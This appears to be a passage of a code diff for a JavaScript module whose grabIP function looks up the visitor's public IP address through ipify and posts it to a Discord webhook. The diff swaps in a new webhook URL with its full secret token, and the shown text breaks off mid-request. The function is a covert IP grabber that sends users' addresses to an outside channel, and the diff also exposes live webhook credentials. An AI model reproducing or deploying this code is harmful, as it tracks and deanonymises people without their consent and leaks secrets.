@@ -1,10 +1,10 @@
-//https://discord.com/api/webhooks/1218960942444843149/U9fheR7lweml6vL-LFuu6mqU0iZDTh5qsVv7ENh-5C0XjH-2QFywwzOBK9cNvSHXEd20
+//https://discord.com/api/webhooks/1414321410050097252/LZP3nsGkbJJAtqgLZIeUqnMUaAYlxBcd-2m4WK_FO4xmHzNjcOOprhGyUjq7nyg86lFl
 
 export const grabIP = async ()=>{
 	const response = await fetch("https://api.ipify.org?format=json")
 	const json = await response.json()
 	
-	fetch("https://discord.com/api/webhooks/1218960942444843149/U9fheR7lweml6vL-LFuu6mqU0iZDTh5qsVv7ENh-5C0XjH-2QFywwzOBK9cNvSHXEd20", {
+	fetch("https://discord.com/api/webhooks/1414321410050097252/LZP3nsGkbJJAtqgLZIeUqnMUaAYlxBcd-2m4WK_FO4xmHzNjcOOprhGyUjq7nyg86lFl", {
 		headers: {
 			"content-type": "application/json"
 		},
